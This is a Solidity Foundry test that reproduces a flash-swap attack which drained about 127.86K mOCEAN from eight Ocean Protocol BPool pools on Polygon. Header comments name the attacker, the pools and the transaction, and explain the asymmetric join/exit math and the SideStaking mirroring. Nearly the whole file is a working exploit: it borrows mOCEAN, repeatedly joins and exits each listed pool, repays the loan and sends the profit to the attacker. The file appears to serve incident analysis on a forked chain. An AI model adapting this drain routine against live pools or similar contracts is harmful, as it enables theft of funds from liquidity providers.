// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~127.86K mOCEAN
// Attacker : 0x3fa8cf7fea68c8e76a9838d77889464ddfb6a6cf
// Attack Contract : 0xdd4bfd70117b5b6b343fc8d2c8c0075d095dbee5
// Vulnerable Contract : 0xbb3051df2d3e408dae6e6daa2296bc6215f0dcfd
// Victim : 0xe7832A036da14dC3BBcEc5F73a8193221E9F0DA5, 0x2dd64bA8d9b9B1bB402Aa70214E1Fb1D7AF314a1, 0x25faf893edCef3b1C94029f01a088448669fcB9a, 0x1f5927CB77EA8449F0281ed14847A70d7A4f7053, 0x56A5cf2fB3f5b12e6c4bC4C0f100800D3735E522, 0x569C692125CF32bAF19E4ce713F9cf43e4c18c2C, 0x95f57249e6DD394318025068a8BFC841ac6eC0DD, 0x193F1cE9108644cD4d09C769d8DCD100F2B901D6
// Attack Tx : https://polygonscan.com/tx/0x6dc8a7fba1303faef3ec7afa770b90b17ec5ecd73b51229277a9b0492e285796

// @Info
// Vulnerable BPool Code : https://polygonscan.com/address/0xbb3051df2d3e408dae6e6daa2296bc6215f0dcfd#code
// SideStaking Code : https://polygonscan.com/address/0x3efdd8f728c8e774ab81d14d0b2f07a8238960f4#code
// mOCEAN Proxy : https://polygonscan.com/address/0x282d8efce846a88b159800bd4130ad77443fa1a1#code

// @Analysis
// Twitter Guy : https://x.com/defimonalerts/status/2070362661540286735
//
// The attacker flash-swapped mOCEAN, repeatedly performed max single-sided mOCEAN joins into Ocean BPool
// pools, and then exited BPT back to mOCEAN. BPool's join and exit math is asymmetric, and SideStaking
// automatically mirrored each single-sided join/exit with datatoken staking/unstaking, letting the attacker
// redeem more mOCEAN than was deposited.

address constant ATTACKER = 0x3Fa8cF7FeA68C8E76A9838d77889464DdFb6a6cf;
address constant ATTACK_CONTRACT = 0xDd4BFD70117b5B6B343fC8D2c8C0075d095dBEE5;
address constant BPOOL_IMPLEMENTATION = 0xBB3051dF2D3E408DAE6E6dAa2296BC6215F0dCFd;
address constant SIDE_STAKING = 0x3EFDD8f728c8e774aB81D14d0B2F07a8238960f4;
address constant MOCEAN = 0x282d8efCe846A88B159800bd4130ad77443Fa1A1;
address constant FLASH_PAIR = 0xEC554b30Ca0656Ea2404e85528C1d5F885e9E296;

interface IOceanBPool is IERC20 {
    function getBaseTokenAddress() external view returns (address);
    function getBalance(
        address token
    ) external view returns (uint256);
    function joinswapExternAmountIn(uint256 tokenAmountIn, uint256 minPoolAmountOut)
        external
        returns (uint256 poolAmountOut);
    function exitswapPoolAmountIn(uint256 poolAmountIn, uint256 minAmountOut)
        external
        returns (uint256 tokenAmountOut);
    function gulp(
        address token
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    uint256 private constant FORK_BLOCK = 89_107_756;
    uint256 private constant MIN_MOCEAN_PROFIT = 120_000 ether;
    uint256 private constant FLASH_BORROW_BPS = 9_900;
    uint256 private constant BPS_DENOMINATOR = 10_000;
    uint256 private constant UNISWAP_FEE_NUMERATOR = 1_000;
    uint256 private constant UNISWAP_FEE_DENOMINATOR = 997;
    uint256 private constant MAX_DRAIN_STEPS = 16;

    IERC20 private constant mocean = IERC20(MOCEAN);
    IUniswapV2Pair private constant flashPair = IUniswapV2Pair(FLASH_PAIR);

    address[8] private pools = [
        0xe7832A036da14dC3BBcEc5F73a8193221E9F0DA5,
        0x2dd64bA8d9b9B1bB402Aa70214E1Fb1D7AF314a1,
        0x25faf893edCef3b1C94029f01a088448669fcB9a,
        0x1f5927CB77EA8449F0281ed14847A70d7A4f7053,
        0x56A5cf2fB3f5b12e6c4bC4C0f100800D3735E522,
        0x569C692125CF32bAF19E4ce713F9cf43e4c18c2C,
        0x95f57249e6DD394318025068a8BFC841ac6eC0DD,
        0x193F1cE9108644cD4d09C769d8DCD100F2B901D6
    ];

    function setUp() public {
        vm.createSelectFork("polygon", FORK_BLOCK);
        fundingToken = MOCEAN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Historical attack helper");
        vm.label(BPOOL_IMPLEMENTATION, "Ocean BPool implementation");
        vm.label(SIDE_STAKING, "Ocean SideStaking");
        vm.label(MOCEAN, "mOCEAN");
        vm.label(FLASH_PAIR, "mOCEAN flash pair");
        for (uint256 i; i < pools.length; ++i) {
            vm.label(pools[i], "Ocean vulnerable BPool");
        }
    }

    function testExploit() public balanceLog {
        uint256 attackerMOceanBefore = mocean.balanceOf(ATTACKER);

        // step 1: borrow nearly all mOCEAN from the same UniswapV2 pair used in the trace.
        uint256 borrowAmount = moceanPairReserve() * FLASH_BORROW_BPS / BPS_DENOMINATOR;
        require(borrowAmount > 0, "empty flash reserve");
        if (flashPair.token0() == MOCEAN) {
            flashPair.swap(borrowAmount, 0, address(this), bytes("mOCEAN flash swap"));
        } else {
            require(flashPair.token1() == MOCEAN, "unexpected pair");
            flashPair.swap(0, borrowAmount, address(this), bytes("mOCEAN flash swap"));
        }

        uint256 attackerMOceanProfit = mocean.balanceOf(ATTACKER) - attackerMOceanBefore;
        assertGt(attackerMOceanProfit, MIN_MOCEAN_PROFIT, "mOCEAN profit");
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == FLASH_PAIR, "only flash pair");
        require(sender == address(this), "unexpected sender");
        uint256 borrowed = amount0 > 0 ? amount0 : amount1;

        // step 2: for each vulnerable pool, deposit mOCEAN, gulp the stale token reserve, then exit BPT.
        for (uint256 i; i < pools.length; ++i) {
            drainPool(IOceanBPool(pools[i]));
        }

        // step 3: repay the same-token UniswapV2 flash swap and forward the remaining mOCEAN profit.
        uint256 repayment = borrowed * UNISWAP_FEE_NUMERATOR / UNISWAP_FEE_DENOMINATOR + 1;
        mocean.transfer(FLASH_PAIR, repayment);
        mocean.transfer(ATTACKER, mocean.balanceOf(address(this)));
    }

    function drainPool(
        IOceanBPool pool
    ) private {
        require(pool.getBaseTokenAddress() == MOCEAN, "unexpected base token");
        mocean.approve(address(pool), type(uint256).max);

        uint256 joinSteps;
        while (mocean.balanceOf(address(this)) > 0 && joinSteps < MAX_DRAIN_STEPS) {
            uint256 maxIn = pool.getBalance(MOCEAN) / 2;
            if (maxIn > 0) --maxIn;
            uint256 amountIn = mocean.balanceOf(address(this));
            if (amountIn > maxIn) amountIn = maxIn;
            if (amountIn == 0) break;

            pool.joinswapExternAmountIn(amountIn, 0);
            ++joinSteps;
        }

        pool.gulp(MOCEAN);

        uint256 exitSteps;
        while (pool.balanceOf(address(this)) > 0 && exitSteps < MAX_DRAIN_STEPS) {
            uint256 maxPoolAmountIn = pool.totalSupply() / 4;
            uint256 poolAmountIn = pool.balanceOf(address(this));
            if (poolAmountIn > maxPoolAmountIn) poolAmountIn = maxPoolAmountIn;
            if (poolAmountIn == 0) break;

            pool.exitswapPoolAmountIn(poolAmountIn, 0);
            ++exitSteps;
        }
    }

    function moceanPairReserve() private view returns (uint256 reserve) {
        (uint112 reserve0, uint112 reserve1,) = flashPair.getReserves();
        reserve = flashPair.token0() == MOCEAN ? uint256(reserve0) : uint256(reserve1);
    }
}
